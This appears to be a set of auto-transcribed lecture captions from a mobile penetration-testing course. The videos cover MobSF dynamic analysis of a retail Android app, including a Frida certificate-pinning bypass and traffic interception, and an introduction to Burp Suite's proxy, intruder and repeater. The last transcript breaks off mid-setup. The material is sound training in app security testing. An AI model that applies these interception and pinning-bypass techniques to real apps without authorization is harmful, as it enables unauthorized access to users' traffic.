00:06:19.200 --> 00:06:21.100
and then it will be available on port

159
00:06:21.100 --> 00:06:24.600
8000 on localhost, which I already have my

160
00:06:24.600 --> 00:06:26.620
web browser set up here.

161
00:06:27.300 --> 00:06:30.140
So here we go, port 8000 localhost.

162
00:06:30.420 --> 00:06:32.260
Now the first thing you need to do

163
00:06:32.260 --> 00:06:35.340
if you have not loaded the application that

164
00:06:35.340 --> 00:06:37.300
you're going to take a look at with

165
00:06:37.300 --> 00:06:39.860
your dynamic analysis, you need to upload it

166
00:06:39.860 --> 00:06:40.160
here.

167
00:06:40.600 --> 00:06:42.300
Now in my case to make this a

168
00:06:42.300 --> 00:06:44.420
little bit more interesting I'm actually going to

169
00:06:44.420 --> 00:06:48.080
use the Joann Fabrics apk that I'll be

170
00:06:48.080 --> 00:06:50.360
using in the next video as well for

171
00:06:50.360 --> 00:06:53.140
our kind of more manual dynamic analysis.

172
00:06:53.960 --> 00:06:57.560
So you need to upload whatever application it

173
00:06:57.560 --> 00:06:59.060
is that you're taking a look at.

174
00:06:59.320 --> 00:07:00.800
You can look at the static report in

175
00:07:00.800 --> 00:07:03.120
MobSF or you can just click the dynamic

176
00:07:03.120 --> 00:07:04.200
report at this point.

177
00:07:04.560 --> 00:07:06.280
So I'm going to click the dynamic report

178
00:07:06.280 --> 00:07:07.980
and this is going to work because I

179
00:07:07.980 --> 00:07:09.440
already have the emulator up here.

180
00:07:09.440 --> 00:07:11.580
You might need to put in a pin

181
00:07:11.580 --> 00:07:13.200
if it requires you to.

182
00:07:14.100 --> 00:07:16.000
So I'm going to click dynamic report here

183
00:07:16.000 --> 00:07:16.980
in MobSF.

184
00:07:23.820 --> 00:07:25.560
Looks like it doesn't want to here so

185
00:07:25.560 --> 00:07:27.440
I'm going to click static report and regenerate

186
00:07:27.440 --> 00:07:28.380
the static report.

187
00:07:28.480 --> 00:07:29.940
It might take a minute to generate.

188
00:07:30.600 --> 00:07:32.440
Okay so here's the static report and then

189
00:07:32.440 --> 00:07:34.920
I need to click start dynamic analysis here

190
00:07:34.920 --> 00:07:36.800
and now it should bring me into the

191
00:07:36.800 --> 00:07:38.220
dynamic analysis section.

192
00:07:38.660 --> 00:07:40.520
It might take a few minutes to get

193
00:07:40.520 --> 00:07:41.160
to that screen.

194
00:07:41.640 --> 00:07:44.540
Okay so here we are on the MobSF

195
00:07:44.540 --> 00:07:48.120
dynamic analysis screen and what this has actually

196
00:07:48.120 --> 00:07:50.320
done, if you look into the command prompt

197
00:07:50.320 --> 00:07:53.920
here, it's going to show you all the

198
00:07:53.920 --> 00:07:54.440
stuff it did.

199
00:07:54.600 --> 00:07:57.560
So it installed the MobSF root CA, it

200
00:07:57.560 --> 00:08:02.080
set the proxy to port 1337, it started

201
00:08:02.080 --> 00:08:04.480
the clipboard monitor, it set a global proxy

202
00:08:04.480 --> 00:08:06.280
for the android virtual machine.

203
00:08:06.780 --> 00:08:09.320
So MobSF is actually able to intercept our

204
00:08:09.320 --> 00:08:13.280
traffic and do some Frida instrumentation as well.

205
00:08:13.480 --> 00:08:15.320
And what we can do here, there's a

206
00:08:15.320 --> 00:08:17.320
bunch of different things that we can do.

207
00:08:17.400 --> 00:08:19.740
We can do this button like show screen.

208
00:08:19.960 --> 00:08:22.160
This could be useful if you're using an

209
00:08:22.160 --> 00:08:24.080
emulator maybe on a different system and you're

210
00:08:24.080 --> 00:08:27.980
using MobSF, you know, as like a cloud

211
00:08:27.980 --> 00:08:30.440
website that you're reaching out to.

212
00:08:30.520 --> 00:08:32.340
So you can actually show the screen of

213
00:08:32.340 --> 00:08:32.880
the phone.

214
00:08:33.080 --> 00:08:34.860
In this case we actually have the emulator

215
00:08:34.860 --> 00:08:36.659
here locally so we do not need to

216
00:08:36.659 --> 00:08:37.659
show the screen here.

217
00:08:37.919 --> 00:08:40.480
We can remove the MobSF root CA if

218
00:08:40.480 --> 00:08:41.120
we wanted to.

219
00:08:41.580 --> 00:08:43.640
Something awesome that we can do is actually

220
00:08:43.640 --> 00:08:45.800
start the exported activity tester.

221
00:08:46.240 --> 00:08:47.640
So if we click this it's going to

222
00:08:47.640 --> 00:08:49.860
start running our phone, it's going to start

223
00:08:49.860 --> 00:08:52.980
going to every single exported activity that is

224
00:08:52.980 --> 00:08:54.280
available on the application.

225
00:08:54.440 --> 00:08:55.660
So you can see there it brought up

226
00:08:55.660 --> 00:08:59.100
like the onboarding activity, any other exported activity

227
00:08:59.100 --> 00:09:00.920
it's going to try to bring up here.

228
00:09:01.000 --> 00:09:02.700
We can actually watch this just go through

229
00:09:02.700 --> 00:09:06.060
it automatically from the app's perspective.

230
00:09:06.060 --> 00:09:07.540
So you saw there that it only brought

231
00:09:07.540 --> 00:09:09.620
up a few activities, looks like a little

232
00:09:09.620 --> 00:09:13.020
onboarding activity, and just let Joe and Splash

233
00:09:13.020 --> 00:09:13.660
screen in there.

234
00:09:14.540 --> 00:09:16.660
We can also click like the start activity

235
00:09:16.660 --> 00:09:17.440
tester here.

236
00:09:17.620 --> 00:09:19.860
It's going to start trying to navigate through

237
00:09:19.860 --> 00:09:22.360
the application and see what it can get

238
00:09:22.360 --> 00:09:25.100
through to from other areas of the application.

239
00:09:26.320 --> 00:09:27.980
It's just going to keep on running through

240
00:09:27.980 --> 00:09:28.260
these.

241
00:09:28.340 --> 00:09:30.380
So this could be just interesting, something to

242
00:09:30.380 --> 00:09:32.160
watch for a few minutes and see what

243
00:09:32.160 --> 00:09:35.040
screens it can get through automatically, right?

244
00:09:35.640 --> 00:09:37.480
I don't think it's going to necessarily bring

245
00:09:37.480 --> 00:09:41.480
anything too interesting up here, but we'll see

246
00:09:41.480 --> 00:09:42.120
what it brings.

247
00:09:47.060 --> 00:09:49.740
Looks like the application actually crashed there.

248
00:09:51.060 --> 00:09:52.420
It's going to keep on trying to bring

249
00:09:52.420 --> 00:09:53.520
up some different activities.

250
00:09:55.480 --> 00:09:57.640
Most of it looks like, oh yep, there

251
00:09:57.640 --> 00:09:59.320
we go, some kind of a picture function

252
00:09:59.320 --> 00:10:00.340
that might be exported.

253
00:10:06.470 --> 00:10:08.290
So it's pretty much just trying to walk

254
00:10:08.290 --> 00:10:10.630
through the application and show you all the

255
00:10:10.630 --> 00:10:12.410
various activities that you might be able to

256
00:10:12.410 --> 00:10:14.410
get to from other activities, right?

257
00:10:14.950 --> 00:10:17.430
Okay, now the activity testing is completed.

258
00:10:17.690 --> 00:10:20.930
Didn't necessarily find anything too interesting there, but

259
00:10:20.930 --> 00:10:23.950
it is something just useful to use to

260
00:10:23.950 --> 00:10:25.490
see if anything does come up.

261
00:10:26.030 --> 00:10:27.590
For example, if we're doing this with the

262
00:10:27.590 --> 00:10:30.330
Android application, we would actually find some flags

263
00:10:30.330 --> 00:10:31.330
by doing that, right?

264
00:10:31.610 --> 00:10:34.150
Because we had some exported activities that had

265
00:10:34.150 --> 00:10:35.250
sensitive information.

266
00:10:36.090 --> 00:10:38.470
Okay, I can also, if I'm just like

267
00:10:38.470 --> 00:10:40.750
navigating through the app, I can use this

268
00:10:40.750 --> 00:10:41.990
take screenshot button.

269
00:10:42.410 --> 00:10:45.950
So I could click like through here and

270
00:10:45.950 --> 00:10:48.290
just skip everything for now.

271
00:10:48.370 --> 00:10:51.770
If I want to take a screenshot, okay,

272
00:10:51.810 --> 00:10:52.170
sure.

273
00:10:53.830 --> 00:10:55.710
So I can just like take a screenshot

274
00:10:55.710 --> 00:10:57.530
of the app and this will actually go

275
00:10:57.530 --> 00:10:58.590
out into the report.

276
00:10:58.730 --> 00:11:00.130
So if I was like scrolling through the

277
00:11:00.130 --> 00:11:03.750
application, found something interesting, I could always take

278
00:11:03.750 --> 00:11:06.450
a screenshot and it will record that for

279
00:11:06.450 --> 00:11:06.870
me, right?

280
00:11:07.190 --> 00:11:09.670
We can also click this Logcat stream button

281
00:11:09.670 --> 00:11:12.390
here and this will actually start, you know,

282
00:11:12.850 --> 00:11:14.610
printing out the entire Logcat here.

283
00:11:14.690 --> 00:11:15.890
We don't want to go back to Android

284
00:11:15.890 --> 00:11:17.030
Studio to see that.

285
00:11:17.330 --> 00:11:19.590
You can also stop streaming the Logcat if

286
00:11:19.590 --> 00:11:21.010
you ever want to stop it and actually

287
00:11:21.010 --> 00:11:21.950
take a look here.

288
00:11:22.310 --> 00:11:24.770
You think like something sensitive was put into

289
00:11:24.770 --> 00:11:27.950
the logs and you can also start it

290
00:11:27.950 --> 00:11:28.450
up again.

291
00:11:28.610 --> 00:11:31.390
So maybe if you're navigating through the application,

292
00:11:31.470 --> 00:11:33.210
you think something might be sensitive, you can

293
00:11:33.210 --> 00:11:35.470
start and stop the stream as you want.

294
00:11:36.450 --> 00:11:38.230
Okay, I'm going to stop that streaming, go

295
00:11:38.230 --> 00:11:40.070
back to our dynamic analyser here.

296
00:11:40.790 --> 00:11:43.270
There's also a tonne of different options down

297
00:11:43.270 --> 00:11:43.670
here.

298
00:11:43.810 --> 00:11:46.170
You can do like capture strings here.

299
00:11:46.450 --> 00:11:49.190
You can also click this Start Instrumentation.

300
00:11:49.190 --> 00:11:51.590
You can also do the Frida Live Logs

301
00:11:51.590 --> 00:11:51.830
here.

302
00:11:52.150 --> 00:11:54.190
I'm going to click Start Instrumentation, do the

303
00:11:54.190 --> 00:11:55.290
Frida Live Logs.

304
00:11:55.430 --> 00:11:57.510
It's going to refresh the data every 10

305
00:11:57.510 --> 00:11:58.030
seconds.

306
00:11:58.270 --> 00:12:02.790
Maybe as we're like navigating through here, I

307
00:12:02.790 --> 00:12:04.690
can start searching on products and it might

308
00:12:04.690 --> 00:12:07.050
start refreshing with like, here we go.

309
00:12:07.190 --> 00:12:11.430
So you can see that, you know, some

310
00:12:11.430 --> 00:12:13.730
certificate pinning might have been bypassed here.

311
00:12:16.610 --> 00:12:19.590
So it looks like it's bypassing the verify

312
00:12:19.590 --> 00:12:20.630
certificate chain.

313
00:12:22.270 --> 00:12:23.710
See if we can get some how-to

314
00:12:23.710 --> 00:12:24.890
documents in here.

315
00:12:25.810 --> 00:12:28.330
See if it's bypassing SSL for those kind

316
00:12:28.330 --> 00:12:29.310
of things as well.

317
00:12:30.850 --> 00:12:38.320
If we searched here, for example, I can

318
00:12:38.320 --> 00:12:40.640
go to like the category fabrics there, or

319
00:12:40.640 --> 00:12:41.820
I can just search for it in the

320
00:12:41.820 --> 00:12:44.440
search bar, and we can see like our

321
00:12:44.440 --> 00:12:47.260
Frida instrumentation there as well.

322
00:12:47.380 --> 00:12:49.100
So like if we're looking for fabrics, this

323
00:12:49.100 --> 00:12:50.260
is something that I kind of do in

324
00:12:50.260 --> 00:12:52.060
the next videos as well.

325
00:12:53.240 --> 00:12:55.700
You can see the fabrics and everything here,

326
00:12:55.880 --> 00:12:58.160
and you know, just click through and you

327
00:12:58.160 --> 00:13:00.560
can see everything that Frida is doing in

328
00:13:00.560 --> 00:13:01.320
the back end here.

329
00:13:02.200 --> 00:13:04.640
And we can also go to the live

330
00:13:04.640 --> 00:13:07.560
API monitor here, and this will actually allow

331
00:13:07.560 --> 00:13:10.380
us to see data that is being called

332
00:13:10.380 --> 00:13:12.520
through the application.

333
00:13:12.660 --> 00:13:15.400
So if I click here, like this fabric

334
00:13:15.400 --> 00:13:19.180
here to bring up the product, we should

335
00:13:19.180 --> 00:13:22.100
actually see some APIs going by.

336
00:13:22.420 --> 00:13:24.320
This would be like the Android APIs that

337
00:13:24.320 --> 00:13:25.040
are coming by.

338
00:13:27.750 --> 00:13:29.590
You can see like the crypto hashes, all

339
00:13:29.590 --> 00:13:31.350
the different types of functions that are being

340
00:13:31.350 --> 00:13:34.070
pulled from Android itself.

341
00:13:34.490 --> 00:13:37.410
The final part of MobSF dynamic analysis to

342
00:13:37.410 --> 00:13:38.950
know is that you can click this generate

343
00:13:38.950 --> 00:13:41.810
report button, and this will actually start aggregating

344
00:13:41.810 --> 00:13:44.250
everything that you've done here in the dynamic

345
00:13:44.250 --> 00:13:45.090
analyser.

346
00:13:45.390 --> 00:13:47.170
It's also going to allow us to go

347
00:13:47.170 --> 00:13:49.730
to this new thing called the HTTP tools,

348
00:13:50.070 --> 00:13:51.210
where we'll be able to see some of

349
00:13:51.210 --> 00:13:52.930
the network calls that were made by the

350
00:13:52.930 --> 00:13:53.490
application.

351
00:13:54.490 --> 00:13:56.150
So it's going to take a second to

352
00:13:56.150 --> 00:13:59.650
generate this report, and here we can see

353
00:13:59.650 --> 00:14:02.690
we have like the API monitor view, Frida

354
00:14:02.690 --> 00:14:05.170
logs view, again similar stuff to what we

355
00:14:05.170 --> 00:14:07.650
saw before, and we can actually take a

356
00:14:07.650 --> 00:14:09.230
look through this report as well.

357
00:14:09.470 --> 00:14:11.230
You can see some stuff here for SQL

358
00:14:11.230 --> 00:14:13.970
-like databases, tonnes of information in there, and

359
00:14:13.970 --> 00:14:16.770
also any screenshots that you took would be

360
00:14:16.770 --> 00:14:17.850
here as well.

361
00:14:18.310 --> 00:14:20.210
And you can see all the different types

362
00:14:20.210 --> 00:14:23.190
of places it's going with the server locations.

363
00:14:23.450 --> 00:14:25.470
It also has the domain malware check, so

364
00:14:25.470 --> 00:14:27.210
kind of a mix of like the screenshots

365
00:14:27.210 --> 00:14:29.610
and everything that you've taken, and the static

366
00:14:29.610 --> 00:14:30.630
analysis as well.

367
00:14:30.910 --> 00:14:33.210
The other nice new tool that's here is

368
00:14:33.210 --> 00:14:35.890
this start HTTP tool.

369
00:14:36.070 --> 00:14:37.850
So I can actually click this, it will

370
00:14:37.850 --> 00:14:39.950
show me some of the network traffic that

371
00:14:39.950 --> 00:14:42.350
was generated by Joanne Fabric's app.

372
00:14:42.710 --> 00:14:43.970
I'm just going to open up here my

373
00:14:43.970 --> 00:14:47.170
emulator, and it should start loading.

374
00:14:52.280 --> 00:14:54.500
Okay, and here we can actually see a

375
00:14:54.500 --> 00:14:57.480
bunch of the traffic that was captured, and

376
00:14:57.480 --> 00:14:59.260
the other cool thing is that you can

377
00:14:59.260 --> 00:15:01.480
just click this right, and it will show

378
00:15:01.480 --> 00:15:03.360
you like all the requests that were made,

379
00:15:03.540 --> 00:15:05.580
and you can look here on the request

380
00:15:05.580 --> 00:15:07.400
in response, and you can actually edit some

381
00:15:07.400 --> 00:15:08.400
of the stuff as well.

382
00:15:08.660 --> 00:15:12.320
And then if you have a API of

383
00:15:12.320 --> 00:15:14.360
interest, or some kind of a network call

384
00:15:14.360 --> 00:15:16.660
of interest, like say for example this post

385
00:15:16.660 --> 00:15:19.300
request was interesting to me, you can actually

386
00:15:19.300 --> 00:15:21.680
click this send to fuzzer button, and if

387
00:15:21.680 --> 00:15:23.460
you have Burp Suite set up on say

388
00:15:23.460 --> 00:15:26.620
port 8080, or whatever port you have Burp

389
00:15:26.620 --> 00:15:29.440
Suite set up, you can actually send this

390
00:15:29.440 --> 00:15:30.980
to the fuzzer as well, and you can

391
00:15:30.980 --> 00:15:32.980
click repeat request, and it will send it

392
00:15:32.980 --> 00:15:33.980
to your fuzzer.

393
00:15:34.380 --> 00:15:36.380
So it'll send it to Burp Suite or

394
00:15:36.380 --> 00:15:38.840
OASIS app, whatever you have as an additional

395
00:15:38.840 --> 00:15:40.440
proxy tool as well.

396
00:15:40.660 --> 00:15:42.260
I'm not going to show that here in

397
00:15:42.260 --> 00:15:43.660
this video because it'll make it a bit

398
00:15:43.660 --> 00:15:46.020
too long, but this is pretty much all

399
00:15:46.020 --> 00:15:47.400
the things that you can do with the

400
00:15:47.400 --> 00:15:49.640
dynamic analysis in MobSF.

401
00:15:49.760 --> 00:15:52.320
There's also other features as well I did

402
00:15:52.320 --> 00:15:54.240
not cover, like when you go back here

403
00:15:54.240 --> 00:15:55.660
and you start the dynamic analysis.

404
00:15:56.080 --> 00:15:58.080
There's a few more check boxes, and different

405
00:15:58.080 --> 00:15:59.980
Frida scripts, and things like that that you

406
00:15:59.980 --> 00:16:01.020
can run as well.

407
00:16:01.540 --> 00:16:03.300
So go ahead and take a look at

408
00:16:03.300 --> 00:16:06.000
the MobSF documentation if you're interested in those

409
00:16:06.000 --> 00:16:06.920
additional features.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.640 --> 00:00:02.740
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's do a quick introduction to a

2
00:00:02.740 --> 00:00:04.440
tool called Burpsuite.

3
00:00:04.960 --> 00:00:07.900
Now Burpsuite can be found on portswigger.net

4
00:00:07.900 --> 00:00:10.900
under products here, and we have three different

5
00:00:10.900 --> 00:00:12.640
versions of Burpsuite.

6
00:00:12.880 --> 00:00:16.040
The most commonly used one for penetration testers

7
00:00:16.040 --> 00:00:18.900
is the community edition, but I would recommend

8
00:00:18.900 --> 00:00:20.680
if you're going to be a professional bug

9
00:00:20.680 --> 00:00:24.080
bounty hunter or a professional penetration tester that

10
00:00:24.080 --> 00:00:26.180
you definitely go ahead and look at least

11
00:00:26.180 --> 00:00:29.320
at Burpsuite Professional, because this actually has a

12
00:00:29.320 --> 00:00:32.020
lot of different cool tools that help make

13
00:00:32.020 --> 00:00:34.460
Burpsuite be a little bit more automated and

14
00:00:34.460 --> 00:00:36.500
to do some of your testing for you.

15
00:00:36.980 --> 00:00:40.560
So a professional license is about $400 for

16
00:00:40.560 --> 00:00:41.040
a year.

17
00:00:41.860 --> 00:00:43.820
Obviously do not make that investment if you're

18
00:00:43.820 --> 00:00:46.120
not going to be serious into penetration testing,

19
00:00:46.940 --> 00:00:49.860
but it is something that you should consider

20
00:00:49.860 --> 00:00:51.700
if you're going to be doing a lot

21
00:00:51.700 --> 00:00:52.800
of penetration testing.

22
00:00:53.500 --> 00:00:56.480
Anyway, for this course though Burpsuite Community Edition

23
00:00:56.480 --> 00:00:57.480
will be just fine.

24
00:00:58.220 --> 00:01:00.420
And if you need to download the community

25
00:01:00.420 --> 00:01:02.200
edition, all you need to do is enter

26
00:01:02.200 --> 00:01:03.660
your email and then you're going to click

27
00:01:03.660 --> 00:01:04.980
the download link here.

28
00:01:05.120 --> 00:01:06.940
You can also click the go straight to

29
00:01:06.940 --> 00:01:09.820
downloads here and just download the version of

30
00:01:09.820 --> 00:01:13.520
Burpsuite for whatever operating system you're utilizing.

31
00:01:13.760 --> 00:01:15.660
So we have like Linux, Mac OS, et

32
00:01:15.660 --> 00:01:15.960
cetera.

33
00:01:16.300 --> 00:01:18.240
So you can just download that version for

34
00:01:18.240 --> 00:01:20.260
whatever system you're using.

35
00:01:20.860 --> 00:01:22.920
In my case, we would do Windows.

36
00:01:24.100 --> 00:01:26.240
I do already have this tool installed.

37
00:01:26.640 --> 00:01:27.800
So let me show you what it looks

38
00:01:27.800 --> 00:01:29.780
like after you have everything installed.

39
00:01:38.740 --> 00:01:41.080
So this is Burpsuite Community Edition.

40
00:01:41.940 --> 00:01:43.860
And you can see that with the community

41
00:01:43.860 --> 00:01:46.360
edition, you only have the option for a

42
00:01:46.360 --> 00:01:47.560
temporary project.

43
00:01:47.940 --> 00:01:51.820
So as soon as you're done using Burpsuite,

44
00:01:51.860 --> 00:01:53.960
you're going to lose all of the things

45
00:01:53.960 --> 00:01:55.080
that were saved in here.

46
00:01:55.280 --> 00:01:57.560
And that's the benefit of using the professional

47
00:01:57.560 --> 00:01:58.820
edition as well.

48
00:01:58.980 --> 00:02:01.340
When you have the professional version of Burpsuite,

49
00:02:01.360 --> 00:02:03.700
you can save projects on your disks so

50
00:02:03.700 --> 00:02:05.820
that you can go back to projects or

51
00:02:05.820 --> 00:02:07.620
assessments that you did in the past and

52
00:02:07.620 --> 00:02:09.740
look at all the things that you intercepted.

53
00:02:10.080 --> 00:02:10.980
So if you're going to be a professional

54
00:02:10.980 --> 00:02:13.780
penetration tester, that's another reason why I recommend

55
00:02:13.780 --> 00:02:15.500
Burpsuite Professional Edition.

56
00:02:16.100 --> 00:02:17.900
Anyway, I want to click next to start

57
00:02:17.900 --> 00:02:19.320
a temporary project here.

58
00:02:19.740 --> 00:02:21.100
You can see that you can save some

59
00:02:21.100 --> 00:02:23.720
configuration files here in case there's certain setups

60
00:02:23.720 --> 00:02:25.620
that you need for certain scenarios.

61
00:02:25.820 --> 00:02:28.720
It can be useful for you, especially with

62
00:02:28.720 --> 00:02:30.460
this mobile pen testing stuff where we need

63
00:02:30.460 --> 00:02:33.560
to actually set a few unique options, like

64
00:02:33.560 --> 00:02:35.960
different proxy settings and things like that.

65
00:02:36.220 --> 00:02:37.920
But for now, I'll just use the burp

66
00:02:37.920 --> 00:02:39.860
defaults and click start burp here.

67
00:02:40.820 --> 00:02:43.080
This is going to start our project in

68
00:02:43.080 --> 00:02:43.540
Burpsuite.

69
00:02:45.360 --> 00:02:47.920
And this is what the UI of Burpsuite

70
00:02:47.920 --> 00:02:48.600
looks like.

71
00:02:48.780 --> 00:02:50.940
To give you a quick rundown of all

72
00:02:50.940 --> 00:02:52.840
the tools and everything that are in here,

73
00:02:53.120 --> 00:02:55.700
we have our target tab, and this is

74
00:02:55.700 --> 00:03:00.040
where Burpsuite is going to start populating this

75
00:03:00.040 --> 00:03:02.220
list with the different targets that you've hit.

76
00:03:02.320 --> 00:03:04.680
So when you're using Burpsuite, basically what you'll

77
00:03:04.680 --> 00:03:07.720
be doing is intercepting traffic between your computer

78
00:03:07.720 --> 00:03:10.080
and maybe a website that you're penetration testing

79
00:03:10.080 --> 00:03:11.960
to, or in our case, it's going to

80
00:03:11.960 --> 00:03:13.840
be used for mobile apps as well.

81
00:03:13.940 --> 00:03:16.120
You're going to be intercepting that traffic, and

82
00:03:16.120 --> 00:03:18.720
as you're intercepting traffic, it's going to populate

83
00:03:18.720 --> 00:03:21.380
the host that you're targeting in here.

84
00:03:21.780 --> 00:03:24.100
You can always use this scope setting that's

85
00:03:24.100 --> 00:03:26.760
here under target to add things to your

86
00:03:26.760 --> 00:03:29.800
scope, and this will help to reduce the

87
00:03:29.800 --> 00:03:33.020
number of excess requests that you might be

88
00:03:33.020 --> 00:03:34.320
intercepting with the proxy.

89
00:03:34.780 --> 00:03:37.140
So for example, if you were testing, say,

90
00:03:37.240 --> 00:03:40.060
uber.com, you could add uber.com into

91
00:03:40.060 --> 00:03:42.840
your scope and only intercept traffic that's intended

92
00:03:42.840 --> 00:03:45.740
for that URL, as opposed to other things.

93
00:03:46.640 --> 00:03:48.120
So like, for example, with a lot of

94
00:03:48.120 --> 00:03:51.080
mobile applications, they're usually tracking things like what

95
00:03:51.080 --> 00:03:53.080
you clicked on, what buttons you clicked on

96
00:03:53.080 --> 00:03:56.060
in the application, sending that information to different

97
00:03:56.060 --> 00:03:59.120
types of resources that might be collating, you

98
00:03:59.120 --> 00:04:02.420
know, like what buttons did users actually press,

99
00:04:02.540 --> 00:04:02.720
right?

100
00:04:02.780 --> 00:04:04.300
So if we wanted to ignore some of

101
00:04:04.300 --> 00:04:06.440
that, we could use the scope to help

102
00:04:06.440 --> 00:04:09.540
us control what we are actually seeing being

103
00:04:09.540 --> 00:04:11.000
intercepted by Burpsuite.

104
00:04:11.760 --> 00:04:14.080
Under the proxy here, this is where the

105
00:04:14.080 --> 00:04:16.279
bread and butter of Burpsuite really is.

106
00:04:16.440 --> 00:04:17.579
So you can see this intercept.

107
00:04:17.839 --> 00:04:19.620
You have the option to toggle your intercept

108
00:04:19.620 --> 00:04:22.220
on and off, and when intercept is on,

109
00:04:22.320 --> 00:04:25.000
you'll actually see network traffic going by your

110
00:04:25.000 --> 00:04:27.080
requests that you're making to a web application

111
00:04:27.080 --> 00:04:28.380
or a mobile app.

112
00:04:30.780 --> 00:04:33.300
Here under HTTP history, this is where you'll

113
00:04:33.300 --> 00:04:35.320
actually see all the requests that you've made

114
00:04:35.320 --> 00:04:38.280
that have been in scope throughout the assessment.

115
00:04:38.520 --> 00:04:40.800
So whatever requests have been made here, they'll

116
00:04:40.800 --> 00:04:42.920
all be populated here, and they'll all be

117
00:04:42.920 --> 00:04:45.020
assigned this number here, and it'll be in

118
00:04:45.020 --> 00:04:46.460
a sequential order.

119
00:04:46.920 --> 00:04:48.720
So the most recent requests will be at

120
00:04:48.720 --> 00:04:50.840
the bottom of the list, the oldest requests

121
00:04:50.840 --> 00:04:51.740
will be at the top.

122
00:04:52.380 --> 00:04:55.320
Under options here, there's tons of different options

123
00:04:55.320 --> 00:04:57.280
in terms of Burpsuite of what you can

124
00:04:57.280 --> 00:04:57.620
do.

125
00:04:57.980 --> 00:04:59.080
One of the ones that's going to be

126
00:04:59.080 --> 00:05:01.760
important for this course is the proxy listeners

127
00:05:01.760 --> 00:05:02.200
here.

128
00:05:02.560 --> 00:05:04.680
So when we get to actually intercepting traffic

129
00:05:04.680 --> 00:05:08.020
with our mobile apps, we'll be adding a

130
00:05:08.020 --> 00:05:10.900
new proxy listener here on all interfaces to

131
00:05:10.900 --> 00:05:13.320
be able to actually send traffic to an

132
00:05:13.320 --> 00:05:16.780
interface for our mobile devices, and that will

133
00:05:16.780 --> 00:05:19.060
help us to intercept traffic for devices that

134
00:05:19.060 --> 00:05:22.480
are just plugged in to our laptop or

135
00:05:22.480 --> 00:05:24.860
computer, whatever it may be, and also we

136
00:05:24.860 --> 00:05:27.560
can still catch traffic from emulators that way

137
00:05:27.560 --> 00:05:28.180
as well.

138
00:05:28.900 --> 00:05:32.200
Other useful tools in terms of Burpsuite is

139
00:05:32.200 --> 00:05:33.320
the intruder function.

140
00:05:33.720 --> 00:05:35.780
This can help us to fuzz parameters that

141
00:05:35.780 --> 00:05:36.440
we might find.

142
00:05:36.540 --> 00:05:38.660
So example, if we go to positions here,

143
00:05:38.840 --> 00:05:40.420
this is an example request.

144
00:05:40.620 --> 00:05:42.840
You can see it has some URL parameters

145
00:05:42.840 --> 00:05:43.240
here.

146
00:05:43.560 --> 00:05:45.100
These are all things that we want to

147
00:05:45.100 --> 00:05:48.200
fuzz as penetration testers to see if we

148
00:05:48.200 --> 00:05:50.480
can do something malicious, like a SQL injection

149
00:05:50.480 --> 00:05:53.200
attack, a cross-site scripting attack, etc.

150
00:05:53.820 --> 00:05:56.200
We have different types of payloads in here

151
00:05:56.200 --> 00:05:57.160
under the intruder.

152
00:05:57.780 --> 00:06:00.980
With the pro edition, you actually have some

153
00:06:00.980 --> 00:06:02.780
lists that you can load here that are

154
00:06:02.780 --> 00:06:06.240
pre-populated, made by Portswigger, but with the

155
00:06:06.240 --> 00:06:08.440
community edition, you also have the opportunity to

156
00:06:08.440 --> 00:06:09.280
load files.

157
00:06:09.420 --> 00:06:11.480
If you have a text file maybe with

158
00:06:11.480 --> 00:06:13.100
a bunch of different payloads that you want

159
00:06:13.100 --> 00:06:16.260
to use, you can also just add in

160
00:06:16.260 --> 00:06:17.100
items here.

161
00:06:17.220 --> 00:06:18.780
So like say we wanted to add the

162
00:06:18.780 --> 00:06:21.540
input ABC, we could add that to our

163
00:06:21.540 --> 00:06:22.740
payloads as well.

164
00:06:23.640 --> 00:06:25.900
The repeater as well is a very useful

165
00:06:25.900 --> 00:06:27.960
tool in Burpsuite, where we'll be able to

166
00:06:27.960 --> 00:06:28.960
repeat some requests.

167
00:06:29.060 --> 00:06:31.380
So if you're in your HTTP history here,

168
00:06:31.620 --> 00:06:33.600
and you see an interesting request go by,

169
00:06:33.700 --> 00:06:35.460
you can actually right click it and send

170
00:06:35.460 --> 00:06:37.380
it to repeater, and that will allow you

171
00:06:37.380 --> 00:06:39.280
to repeat that request over and over.

172
00:06:39.420 --> 00:06:41.980
This can be useful for iterating over values

173
00:06:41.980 --> 00:06:45.360
really quickly, like say changing a user ID,

174
00:06:45.660 --> 00:06:48.060
or just testing things on the fly without

175
00:06:48.060 --> 00:06:50.920
going through a more formal tool like intruder.

176
00:06:51.600 --> 00:06:54.880
There's tons of other good options within Burpsuite.

177
00:06:54.960 --> 00:06:56.960
I definitely recommend something that you do as

178
00:06:56.960 --> 00:06:58.760
a pen tester, is you go to the

179
00:06:58.760 --> 00:07:01.800
extender menu as well, and in the bApp

180
00:07:01.800 --> 00:07:04.680
store there's tons and tons of different types

181
00:07:04.680 --> 00:07:06.120
of extenders for Burpsuite.

182
00:07:06.360 --> 00:07:08.260
I definitely recommend that you take a look

183
00:07:08.260 --> 00:07:10.640
through there, just to familiarize yourself with some

184
00:07:10.640 --> 00:07:14.540
different tools that are useful with Burpsuite, and

185
00:07:14.540 --> 00:07:16.040
something else to note is that some of

186
00:07:16.040 --> 00:07:19.720
these are also only available on Burpsuite Professional

187
00:07:19.720 --> 00:07:21.980
Edition, so it kind of adds you know

188
00:07:21.980 --> 00:07:23.960
some more reason to why you might want

189
00:07:23.960 --> 00:07:26.660
to actually invest in a professional license for

190
00:07:26.660 --> 00:07:27.260
Burpsuite.

191
00:07:27.860 --> 00:07:30.800
But overall this is most of the main

192
00:07:30.800 --> 00:07:32.840
things we'll be using through this course when

193
00:07:32.840 --> 00:07:35.940
it comes to Burpsuite, so I'll see you

194
00:07:35.940 --> 00:07:36.680
in the next video.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.640 --> 00:00:02.200
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now that we have Burp Suite installed,

2
00:00:02.400 --> 00:00:04.820
let's actually get this set up and intercepting

3
00:00:04.820 --> 00:00:06.680
some of our Android phone's traffic.

4
00:00:07.300 --> 00:00:09.060
So here I am in Burp Suite on

5
00:00:09.060 --> 00:00:10.900
the left, my emulator on the right.

6
00:00:11.320 --> 00:00:12.960
I'm going to go to the proxy tab

7
00:00:12.960 --> 00:00:15.200
here in Burp Suite, and now go to

8
00:00:15.200 --> 00:00:15.660
options.

9
00:00:16.240 --> 00:00:17.600
And what we need to do here is

10
00:00:17.600 --> 00:00:20.420
